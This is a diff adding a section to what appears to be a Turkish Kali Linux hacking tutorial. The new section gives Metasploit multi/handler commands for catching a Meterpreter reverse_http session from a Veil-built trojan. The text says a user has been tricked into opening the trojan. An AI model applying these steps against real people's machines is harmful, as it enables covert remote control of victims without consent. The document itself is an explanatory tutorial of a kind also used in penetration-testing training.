@@ -79,6 +79,7 @@
   - [Veil](#veil)
     - [Trojan Oluşturmak](#trojan-oluşturmak)
     - [Anti-Virüslere Yakalanmamak](#anti-virüslere-yakalanmamak)
+    - [Multi Handler Oluşturmak](#multi-handler-oluşturmak)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -896,3 +897,18 @@ Oluşturduğumuz Trojanlar'ın **option** seçeneklerini değiştirmek yakalanma
 
 ![Veil Generated Lucky](./assets/29-veil-generated.png)
 
+### Multi Handler Oluşturmak
+Trojanımızı oluşturduk. Bir kullanıcıyı kandırdık ve bir şekilde trojanımızı kullanıcıya açtırdık. Bu aşamada açılan bağlantıyı kendi bilgisayarımızda dinlememiz gerek. Bunun için de `msfconsole` kullanacağız <br><br>
+Terminale `msfconsole` yazarak programı açabiliriz
+<br><br>
+`use exploit/multi/handler` komutu ile gelen bağlantıları dinlememizi sağlayacak olan exploiti çalıştırabiliriz<br><br>
+`set PAYLOAD windows/meterpreter/reverse_http` komutu ile **reverse_http** için oluşturduğumuz trojanı dinlemeye başlayabiliriz. <br><br>
+`show options` ile ilgili konfigürasyonları görebiliriz. 
+
+![Multi Handler Options](./assets/30-multi-handler-options.png)
+
+Trojanımızı oluştururken set ettiğimiz `LHOST` ve `LPORT` 'u burada da set ediyoruz. `set LHOST <LHOST_IP>`
+```
+set LHOST 192.168.1.87
+```
+Ardından `exploit` diyerek exploiti çalıştırabiliriz. İlgili LHOST'da bir session (oturum/bağlantı isteği) oluşturulursa dinlemeye başlayacaktır.
